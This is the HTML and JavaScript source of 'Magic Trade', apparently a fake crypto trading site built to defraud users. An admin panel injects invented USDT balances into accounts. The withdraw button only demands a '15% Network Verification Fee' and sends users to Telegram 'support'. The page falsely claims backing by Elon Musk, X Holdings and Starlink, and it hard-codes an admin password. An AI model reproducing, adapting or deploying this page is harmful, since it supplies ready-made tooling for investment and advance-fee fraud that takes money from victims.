<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Magic Trade | Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        body { background: #010409; color: #e6edf3; font-family: -apple-system, system-ui, sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        .magic-card { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
        .magic-gradient { background: linear-gradient(90deg, #1f6feb 0%, #388ed1 100%); }
        .bottom-nav { background: #0d1117; border-top: 1px solid #30363d; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 12px 0; z-index: 100; }
        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #8b949e; cursor: pointer; }
        .nav-active { color: #58a6ff; }
        /* Grid layout to perfectly match your request */
        .market-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; padding-bottom: 20px; }
        .market-tile { background: #0d1117; border: 1px solid #30363d; padding: 14px; border-radius: 10px; transition: all 0.2s; position: relative; overflow: hidden; }
        .market-tile:active { transform: scale(0.97); background: #161b22; border-color: #58a6ff; }
        .mini-chart-bg { position: absolute; bottom: 0; left: 0; right: 0; height: 30%; opacity: 0.2; pointer-events: none; }
    </style>
</head>
<body>

    <div id="auth-screen" class="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-[#010409] p-6 text-center">
        <h1 class="text-4xl font-black mb-1 text-white tracking-tighter italic">MAGIC<span class="text-blue-500">TRADE</span></h1>
        <p class="text-[9px] text-slate-500 tracking-[0.4em] mb-12 uppercase">Secured by X Holdings</p>
        <div class="magic-card p-6 w-full max-w-sm space-y-4 shadow-2xl">
            <input type="text" id="reg-name" placeholder="Legal Name" class="hidden w-full p-4 rounded-xl bg-black border border-slate-800 text-sm outline-none">
            <input type="email" id="email" placeholder="Email / Terminal ID" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm outline-none">
            <input type="password" id="pass" placeholder="Password" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm outline-none">
            <button onclick="handleAuth()" id="main-btn" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs active:scale-95 shadow-lg shadow-blue-900/20">Access Terminal</button>
            <button onclick="toggleAuth()" id="toggle-btn" class="text-xs text-blue-500 font-bold block mx-auto mt-4">Create New Account</button>
        </div>
    </div>

    <div id="app" class="hidden flex-col h-screen overflow-hidden">
        <header class="p-4 flex justify-between items-center bg-[#0d1117] border-b border-slate-800">
            <div class="flex items-center gap-3">
                <div class="w-9 h-9 bg-blue-600 rounded-full flex items-center justify-center font-bold text-sm shadow-inner" id="avatar">M</div>
                <div>
                    <span id="user-display" class="font-bold text-sm block text-white">---</span>
                    <span class="text-[9px] text-green-500 font-bold uppercase tracking-widest animate-pulse">‚óè Node Live</span>
                </div>
            </div>
            <button onclick="showSection('admin')" id="admin-icon" class="hidden text-xl p-2 bg-slate-800/50 rounded-lg">‚öôÔ∏è</button>
        </header>

        <main class="flex-1 overflow-y-auto pb-32">
            
            <section id="home-sec" class="p-4 space-y-5">
                <div class="magic-card p-6 bg-gradient-to-br from-[#161b22] to-[#010409] border-blue-500/20">
                    <p class="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Account Equity (USDT)</p>
                    <h2 class="text-4xl font-mono font-bold text-white tracking-tighter">$ <span id="balance">0.00</span></h2>
                    <div class="grid grid-cols-2 gap-3 mt-6">
                        <button onclick="showSection('deposit')" class="bg-green-600 py-3 rounded-xl font-bold text-[11px] uppercase tracking-wider shadow-lg shadow-green-900/20">Deposit</button>
                        <button onclick="showSection('withdraw')" class="bg-slate-800 py-3 rounded-xl font-bold text-[11px] uppercase tracking-wider">Withdraw</button>
                    </div>
                </div>

                <div class="magic-card overflow-hidden h-[300px] border-slate-700/50">
                    <div class="p-2 bg-black/60 flex justify-between border-b border-white/5">
                        <span id="chart-title" class="text-[10px] font-bold text-blue-400 uppercase tracking-widest px-2 italic">BTC/USDT Real-Time</span>
                        <span class="text-[9px] text-slate-500 font-bold px-2">100x Leverage</span>
                    </div>
                    <iframe id="main-chart" src="https://s.tradingview.com/widgetembed/?symbol=BTCUSD&interval=1&theme=dark&style=1" class="w-full h-full"></iframe>
                </div>

                <div class="pt-2">
                    <div class="flex justify-between items-center mb-3">
                        <h4 class="text-[11px] font-black uppercase text-slate-500 tracking-[0.2em]">Global Market Watch</h4>
                        <span class="text-[9px] text-blue-500 font-bold">LIVE FEED</span>
                    </div>
                    <div class="market-grid" id="market-tiles">
                        </div>
                </div>
            </section>

            <section id="settings-sec" class="hidden p-6 space-y-4">
                <h3 class="text-xl font-bold">Terminal Info</h3>
                <div class="magic-card p-5 space-y-4">
                    <div class="flex justify-between items-center py-3 border-b border-slate-800">
                        <span class="text-sm font-medium">Network Provider</span>
                        <span class="text-blue-400 text-xs font-black italic">ELON MUSK / X-CORP</span>
                    </div>
                    <div class="flex justify-between items-center py-3 border-b border-slate-800">
                        <span class="text-sm">Server Status</span>
                        <span class="text-green-500 text-[10px] font-bold px-2 py-1 bg-green-500/10 rounded">ENCRYPTED</span>
                    </div>
                    <div class="p-4 bg-black/40 rounded-xl text-[11px] text-slate-500 leading-relaxed">
                        Magic Trade uses Starlink satellite nodes for zero-latency institutional trade execution. Verified by X Holdings.
                    </div>
                </div>
                <button onclick="logout()" class="w-full p-4 text-red-500 font-bold bg-red-500/10 rounded-xl text-sm mt-4">Secure Sign Out</button>
            </section>

            <section id="withdraw-sec" class="hidden p-6 text-center space-y-4">
                <h3 class="text-xl font-bold">Withdraw Portal</h3>
                <div class="magic-card p-6 space-y-4">
                    <input type="text" placeholder="Wallet Address / Bank Details" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm">
                    <button onclick="alert('VERIFICATION REQUIRED:\nA 15% Network Verification Fee is required to release these funds. Contact Support for billing.')" class="w-full magic-gradient p-4 rounded-xl font-bold text-xs uppercase">Process Payout</button>
                </div>
            </section>

            <section id="admin-sec" class="hidden p-6 space-y-4">
                <div class="magic-card p-6 border-blue-500/50 bg-blue-900/5">
                    <h4 class="text-blue-500 font-black mb-6 uppercase text-xs">Admin Capital Injection</h4>
                    <input type="email" id="adm-target" placeholder="User Email" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm mb-3">
                    <input type="number" id="adm-amt" placeholder="USDT Amount" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm mb-4">
                    <button onclick="adminInject()" class="w-full magic-gradient p-4 rounded-xl font-bold text-xs">INJECT NOW</button>
                </div>
            </section>
        </main>

        <nav class="bottom-nav">
            <div onclick="showSection('home')" class="nav-item nav-active"><span>üìä</span><span>Markets</span></div>
            <div onclick="window.open('https://t.me/+12156208677')" class="nav-item"><span>üí¨</span><span>Support</span></div>
            <div onclick="showSection('settings')" class="nav-item"><span>üõ°Ô∏è</span><span>Settings</span></div>
        </nav>
    </div>

    <script>
        const assetList = [
            { name: "BTC/USDT", sym: "BTCUSD", chg: "+2.41%", up: true },
            { name: "ETH/USDT", sym: "ETHUSD", chg: "+1.18%", up: true },
            { name: "SOL/USDT", sym: "SOLUSD", chg: "+5.92%", up: true },
            { name: "XAU/USD", sym: "XAUUSD", chg: "-0.24%", up: false },
            { name: "TSLA/USD", sym: "TSLA", chg: "+3.10%", up: true },
            { name: "AAPL/USD", sym: "AAPL", chg: "-1.05%", up: false },
            { name: "EUR/USD", sym: "EURUSD", chg: "+0.08%", up: true },
            { name: "GBP/USD", sym: "GBPUSD", chg: "-0.12%", up: false },
            { name: "DOGE/USD", sym: "DOGEUSD", chg: "+12.4%", up: true },
            { name: "NVDA/USD", sym: "NVDA", chg: "+4.20%", up: true }
        ];

        let users = JSON.parse(localStorage.getItem('magic_users')) || { "admin@magic.com": { name: "Root Admin", pass: "boss123", bal: 0, isAdmin: true } };
        let activeSession = localStorage.getItem('magic_session') || null;

        window.onload = () => {
            renderGrids();
            if(activeSession && users[activeSession]) enterApp(activeSession);
        };

        function renderGrids() {
            const grid = document.getElementById('market-tiles');
            grid.innerHTML = assetList.map(a => `
                <div class="market-tile" onclick="switchAsset('${a.sym}', '${a.name}')">
                    <div class="flex justify-between items-start mb-2">
                        <p class="text-[10px] font-black text-white italic">${a.name}</p>
                        <span class="text-[8px] bg-white/5 px-1 rounded text-slate-500">100x</span>
                    </div>
                    <p class="text-xs font-mono font-bold ${a.up ? 'text-green-500' : 'text-red-500'}">${a.chg}</p>
                    <div class="mini-chart-bg bg-gradient-to-t ${a.up ? 'from-green-500/20' : 'from-red-500/20'} to-transparent"></div>
                </div>
            `).join('');
        }

        function switchAsset(symbol, label) {
            document.getElementById('main-chart').src = `https://s.tradingview.com/widgetembed/?symbol=${symbol}&interval=1&theme=dark&style=1`;
            document.getElementById('chart-title').innerText = `${label} Real-Time`;
            showSection('home');
            window.scrollTo({top: 0, behavior: 'smooth'});
        }

        function handleAuth() {
            const e = document.getElementById('email').value.toLowerCase();
            const p = document.getElementById('pass').value;
            const n = document.getElementById('reg-name').value;
            if(document.getElementById('reg-name').classList.contains('hidden')) {
                if(users[e] && users[e].pass === p) enterApp(e); else alert("ACCESS DENIED");
            } else {
                if(!e || !p || !n) return alert("Fill all fields");
                users[e] = { name: n, pass: p, bal: 0, isAdmin: false };
                save(); alert("ACCOUNT CREATED"); toggleAuth();
            }
        }

        function enterApp(e) {
            activeSession = e; localStorage.setItem('magic_session', e);
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-display').innerText = users[e].name;
            if(users[e].isAdmin) document.getElementById('admin-icon').classList.remove('hidden');
            updateUI();
        }

        function updateUI() {
            document.getElementById('balance').innerText = users[activeSession].bal.toLocaleString(undefined, {minimumFractionDigits: 2});
        }

        function adminInject() {
            const t = document.getElementById('adm-target').value.toLowerCase();
            const a = parseFloat(document.getElementById('adm-amt').value);
            if(users[t]) { 
                users[t].bal += a; save(); alert("CAPITAL INJECTED"); updateUI(); 
            } else { alert("User not found"); }
        }

        function showSection(sec) {
            ['home-sec', 'settings-sec', 'withdraw-sec', 'admin-sec'].forEach(s => document.getElementById(s).classList.add('hidden'));
            document.getElementById(sec + '-sec').classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('nav-active'));
            if(sec === 'home') document.querySelectorAll('.nav-item')[0].classList.add('nav-active');
            if(sec === 'settings') document.querySelectorAll('.nav-item')[2].classList.add('nav-active');
        }

        function toggleAuth() {
            document.getElementById('reg-name').classList.toggle('hidden');
            document.getElementById('main-btn').innerText = document.getElementById('reg-name').classList.contains('hidden') ? "Access Terminal" : "Register Account";
        }
        function save() { localStorage.setItem('magic_users', JSON.stringify(users)); }
        function logout() { localStorage.removeItem('magic_session'); location.reload(); }
    </script>
</body>
</html>
